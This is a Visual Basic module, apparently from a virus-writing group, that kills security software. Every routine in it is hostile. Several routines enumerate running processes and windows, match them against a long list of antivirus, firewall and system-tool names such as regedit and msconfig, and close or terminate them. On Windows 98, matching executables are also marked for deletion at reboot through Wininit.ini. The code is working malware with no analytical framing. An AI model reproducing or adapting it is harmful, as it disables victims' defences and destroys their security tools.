   Attribute VB_Name = "GEDZAC"
   Public Declare Function EnumProcesses Lib "psapi.dll" _
      (ByRef lpidProcess As Long, ByVal cb As Long, _
         ByRef cbNeeded As Long) As Long

   Public Declare Function GetModuleFileNameExA Lib "psapi.dll" _
      (ByVal hProcess As Long, ByVal hModule As Long, _
         ByVal ModuleName As String, ByVal nSize As Long) As Long

   Public Declare Function EnumProcessModules Lib "psapi.dll" _
      (ByVal hProcess As Long, ByRef lphModule As Long, _
         ByVal cb As Long, ByRef cbNeeded As Long) As Long

   Public Const PROCESS_ALL_ACCESS = &H1F0FFF

   Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Public Const WM_CLOSE = &H10
   Public Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
   Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long

   Public Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer
   Public Type OSVERSIONINFO
   dwOSVersionInfoSize As Long: dwMajorVersion As Long: dwMinorVersion As Long: dwBuildNumber As Long: dwPlatformId As Long: szCSDVersion As String * 128
   End Type

   Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Public Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
   Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Public Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
   Public Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
   Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlgas As Long, ByVal lProcessID As Long) As Long
   Public Const TH32CS_SNAPPROCESS As Long = 2&: Const MAX_PATH As Long = 260
   Public Type PROCESSENTRY32
   dwSize As Long: cntUsage As Long: th32ProcessID As Long: th32DefaultHeapID As Long: th32ModuleID As Long: cntThreads As Long: th32ParentProcessID As Long: pcPriClassBase As Long: dwFlags As Long: szexeFile As String * MAX_PATH
   End Type

   Public Function FuncSearchScan(ByVal hWnd As Long, Parametro As Long) As Boolean
   On Error Resume Next: Dim VirTitle As String * 256, Wt As Long, Wc As Long, VirWindow As String, Vc(1 To 13) As String
   Vc(1) = "scan": Vc(2) = "virus": Vc(3) = "trojan": Vc(4) = "panda"
   Vc(5) = "mcafee": Vc(6) = "firewall": Vc(7) = "bitdefender": Vc(8) = "security"
   Vc(9) = "norton": Vc(10) = "norman": Vc(11) = "the hacker": Vc(12) = "thav": Vc(13) = "avp"

   DoEvents

   Wt = GetWindowText(ByVal hWnd, ByVal VirTitle, ByVal Len(VirTitle))
   VirWindow = Left(VirTitle, Wt)

   For i5 = 1 To 13
   If InStr(LCase(VirWindow), Vc(i5)) <> 0 Then
   Wc = PostMessage(ByVal hWnd, WM_CLOSE, vbNull, vbNull)
   End If
   Next

   FuncSearchScan = True
   End Function

   Public Function GetWinVersion() As Long
   On Error Resume Next
       Dim OSinfo As OSVERSIONINFO, retvalue As Integer

       With OSinfo
           .dwOSVersionInfoSize = 148
           .szCSDVersion = Space$(128)
           retvalue = GetVersionExA(OSinfo)
       GetWinVersion = .dwPlatformId
       End With
   End Function

   Public Sub KAnti98()
   On Error Resume Next
   Dim BResult1, BResult2, OProcces, TProcces, CProcces As Long: Dim BProcces As PROCESSENTRY32

   BResult1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
   BProcces.dwSize = Len(BProcces)
   BResult2 = Process32First(BResult1, BProcces)

   Do While BResult2

   If BScan(BProcces.szexeFile) Then

   Set Bf2 = CreateObject("Scripting.FileSystemObject")
   Set Bpf = Bf2.OpenTextFile(Bf2.GetSpecialFolder(0) & "\Wininit.ini", 8)
   Bpf.write vbCrLf & "NUL=" & MsD(Left(BProcces.szexeFile, InStr(LCase(BProcces.szexeFile), ".exe") + 3))
   Bpf.Close
   Set Bf2 = Nothing

   OProcess = OpenProcess(0, False, BProcces.th32ProcessID)
   TProcess = TerminateProcess(OProcess, 0)
   CProcess = CloseHandle(OProcess)
   End If
   BResult2 = Process32Next(BResult1, BProcces)

   Loop

   CProcces = CloseHandle(BResult1)
   End Sub

   Public Function BScan(ExeNm)
   On Error Resume Next
   BScanExe = Array("avp32.exe", "avpmon.exe", "zonealarm.exe", "vshwin32.exe", "vet95.exe", "tbscan.exe", "serv95.exe", "Nspclean.exe", "clrav.com", _
   "scan32.exe", "rav7.exe", "navw.exe", "outpost.exe", "nmain.exe", "navnt.exe", "mpftray.exe", _
   "lockdown2000.exe", "icssuppnt.exe", "icload95.exe", "iamapp.exe", "findviru.exe", "f-agnt95.exe", "dv95.exe", _
   "dv95_o.exe", "claw95ct.exe", "cfiaudit.exe", "avwupd32.exe", "avptc32.exe", "_avp32.exe", "avgctrl.exe", _
   "apvxdwin.exe", "_avpcc.exe", "avpcc.exe", "wfindv32.exe", "vsecomr.exe", "tds2-nt.exe", "sweep95.exe", "EFINET32.EXE", _
   "scrscan.exe", "safeweb.exe", "persfw.exe", "navsched.exe", "nvc95.exe", "nisum.exe", "navlu32.exe", "ALOGSERV", "AMON9X", "AVGSERV9", "AVGW", "avkpop", "avkservice", "AvkServ", "avkwctl9", "AVXMONITOR9X", "AVXMONITORNT", "AVXQUAR", _
   "moolive.exe", "jed.exe", "icsupp95.exe", "ibmavsp.exe", "frw.exe", "f-stopw.exe", "espwatch.exe", "procexp", _
   "dvp95.exe", "cfiadmin.exe", "avwin95.exe", "avpm.exe", "avp.exe", "ave32.exe", _
   "anti-trojan.exe", "webscan.exe", "webscanx.exe", "vsscan40.exe", "tds2-98.exe", "SymProxySvc", "SYMTRAY", "TAUMON", "TCM", "TDS-3", "TFAK", "vbcmserv", "VbCons", "VIR-HELP", "VPC32", "VPTRAY", "VSMAIN", "vsmon", "WIMMUN32", "WGFE95", "WEBTRAP", "WATCHDOG", "WrAdmin", _
   "sphinx.exe", "scanpm.exe", _
   "rescue.exe", "pcfwallicon.exe", "pavcl.exe", "nupgrade.exe", "navwnt.exe", "navapw32.exe", "luall.exe", _
   "iomon98.exe", "icmoon.exe", "fprot.exe", "f-prot95.exe", "esafe.exe", "cleaner3.exe", "IBMASN.EXE", "AVXW", "cfgWiz", "CMGRDIAN", "CONNECTIONMONITOR", "CPDClnt", "DEFWATCH", "CTRL", "defalert", "defscangui", "DOORS", "EFPEADM", "ETRUSTCIPE", "EVPN", "EXPERT", "fameh32", "fch32", "fih32", _
   "blackice.exe", "avsched32.exe", "avpdos32.exe", "avpnt.exe", "avconsol.exe", "ackwin32.exe", "NWTOOL16", "pccwin97", "PROGRAMAUDITOR", "POP3TRAP", "PROCESSMONITOR", "PORTMONITOR", "POPROXY", "pcscan", "pcntmon", "pavproxy", "PADMIN", "pview95", "rapapp.exe", "REALMON", "RTVSCN95", _
   "vsstat.exe", "vettray.exe", "tca.exe", "smc.exe", "scan95.exe", "rav7win.exe", "pccwin98.exe", "KPFW32.EXE", "ADVXDWIN", _
   "padmin.exe", "normist.exe", "navw32.exe", "n32scan.exe", "lookout.exe", "iface.exe", "icloadnt.exe", "SPYXX", "SS3EDIT", "SweepNet", _
   "iamserv.exe", "fp-win.exe", "f-prot.exe", "ecengine.exe", "cleaner.exe", "cfind.exe", "blackd.exe", "RULAUNCH", "sbserv", "SWNETSUP", "WrCtrl", _
   "avpupd.exe", "avkserv.exe", "autodown.exe", "_avpm.exe", "avpm.exe", "regedit.exe", "msconfig.exe", "FPROT95.EXE", "IBMASN.EXE", _
   "sfc.exe", "regedt32.exe", "offguard.exe", "pav.exe", "pavmail.exe", "per.exe", "perd.exe", _
   "pertsk.exe", "perupd.exe", "pervac.exe", "pervacd.exe", "th.exe", "th32.exe", "th32upd.exe", _
   "thav.exe", "thd.exe", "thd32.exe", "thmail.exe", "alertsvc.exe", "amon.exe", "kpf.exe", _
   "antivir", "avsynmgr.exe", "cfinet.exe", "cfinet32.exe", "icmon.exe", "lockdownadvanced.exe", _
   "lucomserver.exe", "mcafee", "navapsvc.exe", "navrunr.exe", "nisserv.exe", _
   "nsched32.exe", "pcciomon.exe", "pccmain.exe", "pview95.exe", "Avnt.exe", "Claw95cf.exe", "Dvp95_0.exe", "Vscan40.exe", "Icsuppnt.exe", "Jedi.exe", "N32scanw.exe", "Pavsched.exe", "Pavw.exe", "Avrep32.exe", "Monitor.exe", _
   "fsgk32", "fsm32", "fsma32", "fsmb32", "gbmenu", "GBPOLL", "GENERICS", "GUARD", "IAMSTATS", "ISRV95", "LDPROMENU", "LDSCAN", "LUSPT", "MCMNHDLR", "MCTOOL", "MCUPDATE", "MCVSRTE", "MGHTML", "MINILOG", "MCVSSHLD", "MCAGENT", "MPFSERVICE", "MWATCH", "NeoWatchLog", "NVSVC32", "NWService", "NTXconfig", "NTVDM", "ntrtscan", "npssvc", "npscheck", "netutils", "ndd32", "NAVENGNAVEX15", _
   "notstart.exe", "zapro.exe", "pqremove.com", "BullGuard", "CCAPP.EXE", "vet98.exe", "VET32.EXE", "VCONTROL.EXE", "claw95.exe", "ANTS", "ATCON", "ATUPDATER", "ATWATCH", "AutoTrace", "AVGCC32", "AvgServ", "AVWINNT", "fnrb32", "fsaa", "fsav32")

   For i7 = 0 To UBound(BScanExe)
   DoEvents
   If InStr(LCase(ExeNm), LCase(BScanExe(i7))) <> 0 Then
   BScan = True
   Exit Function
   End If
   Next
   BScan = False
   End Function

   Public Function MsD(x)
   On Error Resume Next: Msn = Split(x, "\")
   For i8 = 0 To UBound(Msn) - 1
   If Len(Msn(i8)) > 8 Then
   If InStr(Msn(i8), Space(1)) <> 0 Then Msn(i8) = Replace(Msn(i8), Space(1), "")
   Mn1 = Left(Msn(i8), 6) & "~1" & "\"
   Else
   If InStr(Msn(i8), Space(1)) <> 0 Then Msn(i8) = Replace(Msn(i8), Space(1), "")
   Mn1 = Msn(i8) & "\"
   End If
   MsD = MsD & Mn1
   Next
   If Len(Msn(UBound(Msn))) > 12 Then
   MSN2 = Left(Msn(UBound(Msn)), 6) & "~1" & Right(Msn(UBound(Msn)), 4)
   Else
   MSN2 = Msn(UBound(Msn))
   End If
   MsD = MsD & MSN2
   End Function

   Public Sub KantiNT()
   On Error Resume Next
   Dim cb As Long, cbNeeded As Long, NumElements As Long, ProcessIDs() As Long, cbNeeded2 As Long
   Dim Modules(1 To 1024) As Long, lRet As Long, ModuleName As String
   Dim nSize As Long, hProcess As Long, i As Long, sModName As String
   cb = 8: cbNeeded = 96
       Do While cb <= cbNeeded
          cb = cb * 2: ReDim ProcessIDs(cb / 4) As Long: lRet = EnumProcesses(ProcessIDs(1), cb, cbNeeded)
       Loop

   NumElements = cbNeeded / 4
       For i = 1 To NumElements

           hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessIDs(i))
   If hProcess Then
   lRet = EnumProcessModules(hProcess, Modules(1), 1024, cbNeeded2): lRet = EnumProcessModules(hProcess, Modules(1), cbNeeded2, cbNeeded2)
    If lRet <> 0 Then
   ModuleName = Space(260): nSize = 500
   lRet = GetModuleFileNameExA(hProcess, Modules(1), ModuleName, nSize)
   sModName = Left$(ModuleName, lRet)
   If BScan(sModName) = True Then
   lRet = TerminateProcess(hProcess, 0)
   End If
    End If
   End If
   lRet = CloseHandle(hProcess)
   Next
   End Sub
